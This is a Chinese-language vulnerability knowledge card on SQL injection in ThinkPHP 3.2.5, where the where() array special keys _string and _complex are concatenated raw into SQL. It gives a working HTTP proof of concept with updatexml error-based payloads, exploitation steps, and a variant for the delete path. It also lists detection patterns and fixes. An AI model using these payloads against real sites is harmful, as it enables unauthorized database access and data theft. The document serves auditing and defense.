---
id: web-generic-sqli-thinkphp3-parsewhere-special-key-injection
title: ThinkPHP 3.x where() 数组特殊键注入：_string/_complex 经 parseThinkWhere 原样拼入 WHERE
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp3-parsewhere-special-key-injection
aliases:
- _string 注入
- _complex 注入
- _query 注入
- parseThinkWhere 注入
- ThinkPHP where 数组特殊键
- M()->where($param) 注入
- I('post.') 整个数组进 where
tags:
- php
- thinkphp
- thinkphp3
- sql-injection
- where-array
- parse-think-where
- error-based
- source-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: 3.2.5（原文标题与演示版本；原文未给出修复版本区间）
verification:
  verified_by: verifier-V391
  verified_at: '2026-11-09T11:24:55+08:00'
  notes: 已对照原文与全部9张图片核对：Model::where() 存 options['where']、find()->_parseOptions 仅对真实字段 parseType、Driver::select→buildSelectSql→parseSql→parseWhere、parseThinkWhere 的 _string 原样拼接/_complex 递归/_query parse_str 与截图一致；Burp 中 _string 报错注入回显 root@172.22.0.3、_complex 走 DELETE 路径，均与卡内描述一致。注：原文请求仅提交 _string，password 键由登录代码自身 md5(['password']) 补上（截图为 md5 空串）；卡内 PoC 显式带 password=666666 属等价改写，不影响机制。affected_versions 3.2.5 与原文标题/演示一致，保留。无 CVE。
---

## 一句话结论

当应用把整个请求数组（如 `$param = I('post.')`）直接传给 `M()->where($param)` 时，攻击者可额外提交以 `_` 开头的特殊键：`_string` 的值会被 `parseThinkWhere` 原样拼进 WHERE，`_complex` 会递归走 `parseWhere` 再拼接；由于 `_parseOptions` 只对“表中存在的字段名”做类型转换，这些特殊键不会被清洗，最终形成任意 SQL 注入（文章用 updatexml 报错注入验证）。

## 原理

- **入口形态**：控制器 `$param = I('post.')` 取到整个 POST 数组，随后 `$param['password'] = md5(...)` 并 `M('Users')->where($param)->find()`；`where()` 最终把该数组存进 `$this->options['where']`。
- **字段校验只覆盖真实字段**：`find()` 调 `_parseOptions()` 时，若 `options['where']` 是数组，会遍历其键并 `in_array($key, $fields, true)` 判断是否为表字段；只有真实字段才做 `_parseType` 强制类型转换。`_string`、`_complex`、`_query` 不是表字段，原样保留到 SQL 构建阶段。
- **parseWhere 的特殊键分支**：`Driver::select → buildSelectSql → parseSql → parseWhere`。`parseWhere($where)` 处理数组时：若有 `_logic` 则先取 `AND/OR/XOR`；遍历每个键，**数字键会被改写成 `_complex`**，而键名以 `_` 开头（`0 === strpos($key, '_')`）时调用 `parseThinkWhere($key, $val)`。
- **parseThinkWhere 的三种处理**：
  - `_string`：`$whereStr = $val`，即攻击者提供的字符串直接成为 WHERE 条件。
  - `_complex`：`$whereStr = substr($this->parseWhere($val), 6)`，把值再交给 `parseWhere` 递归解析后去掉外层包装，字符串值同样最终原样拼接。
  - `_query`：`parse_str($val, $where)` 后逐项经 `parseKey`/`parseValue` 拼接（文章未给出可用 payload）。
  - 三种分支最终都返回 `' ( ' . $whereStr . ' ) '`，被 `parseWhere` 用 `AND` 与其他条件连接。
- **为什么注入成立**：开发者以为数组键都会被当作字段名校验/转义，但框架把 `_` 前缀键解释为“原始表达式”；攻击者控制整个数组即可自带这些键。同时提交一个合法字段键（如 `password`）可让拼接后的 SQL 语法完整：`WHERE ( <payload> ) AND password = '<md5>'`。
- **报错注入条件**：文章环境开启详细报错，`updatexml`/`extractvalue` 的 XPath 错误会把结果回显在页面与 trace 中。

## 触发条件

- 目标为 ThinkPHP 3.x（文章为 3.2.5），应用存在把用户可控数组整体传入 `where()` 的代码（常见 `where(I('post.'))`、`where($param)`）。
- 请求数组键未被白名单/过滤（框架默认接受 `_` 前缀特殊键）。
- 至少有一个合法表字段键随请求提交，使拼接后的条件语法完整。
- 页面开启调试/详细报错时可直接用报错注入；否则需布尔/时间盲注适配。

## 利用步骤

1. 定位把整个请求数组传入模型查询的入口（登录、搜索、列表等），确认请求键会进入 `where()`，且存在一个会被处理的合法字段键（如 `password`）。
2. 在原请求上增加 `_string=<SQL 片段>`，观察生成的 SQL 变为 `WHERE ( <SQL 片段> ) AND password='...' LIMIT 1`。
3. 报错注入：`_string=updatexml(0,concat(0x7e,user()),0)`，页面回显 `XPATH syntax error: '~<user>'`；换 `database()`、`@@version`、子查询读表。
4. 变体：`_complex=<SQL 片段>` 走递归 parseWhere 的字符串分支，同样拼接执行（文章演示在 delete 路径触发 `DELETE FROM users WHERE ( updatexml(...) ) AND password=...`）。
5. `_query` 分支理论上可构造 `parse_str` 键值，但文章未验证可用性，实战需自行测试。
6. 无回显时改用布尔/时间盲注，并注意 `_string` 内容被包在括号中、需保持语法闭合。

## PoC

```http
POST /index.php/home/index/login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

_string=updatexml(0,concat(0x7e,user()),0)&password=666666
```

生成的 SQL（报错页可见）：

```sql
SELECT * FROM `users` WHERE ( updatexml(0,concat(0x7e,user()),0) )
AND `password` = '<md5(666666)>' LIMIT 1
```

回显示例：`1105:XPATH syntax error: '~root@172.22.0.3'`。

`_complex` 变体：

```http
_complex=updatexml(0,concat(0x7e,database()),0)&password=666666
```

## 变体与关联

- 变体：`_logic=OR/XOR` 控制条件连接；数字键自动转 `_complex`（`0=...` 形式）；`_query` 为未验证分支；与 `exp` 表达式、`find($options)` 的 where 字符串注入同属 ThinkPHP 3 的 WHERE 构建面。
- 关联卡片：[[web-generic-sqli-thinkphp32-find-options-where-string-injection]]（`find($options)` 里 where 为字符串时跳过校验，注入点在 options 污染）；[[web-generic-sqli-thinkphp3-array-exp-union-blacklist-bypass]]（`['exp', ...]` 原始表达式注入）；[[code-analysis-source-audit-thinkphp-i-modifier-where-escape]]（I() 修饰符与 where 两形态审计）；[[web-php-framework-thinkphp32-cache-option-template-cache-include-rce]]（同一“请求数组进模型 options”入口的 cache 文件写 RCE）。
- 边界：仅当应用把用户数组整体传入 `where()` 时成立；若应用逐字段白名单取值、过滤 `_` 前缀键或使用参数化/ORM 绑定，则失效；升级框架或修改 `parseThinkWhere` 行为后需重新验证。

## 检测与防御

- 修复：不要把请求数组直接传给 `where()`；对字段名做白名单（对照 `sqlite_master`/表结构），显式拒绝任何 `_` 开头的键；升级 ThinkPHP 3.x 至修复版本或自行在 `parseWhere` 前剥离特殊键。
- 检测：请求体出现 `_string`、`_complex`、`_query`、`_logic` 键；SQL 日志中 `WHERE ( updatexml`/`extractvalue`/`sleep(` 等异常表达式；同一接口短时间内大量报错注入探测。
- 加固：生产关闭详细报错；数据库账号最小权限；WAF 对 `_string=` 与 SQL 函数组合做规则拦截（注意编码/大小写绕过）。
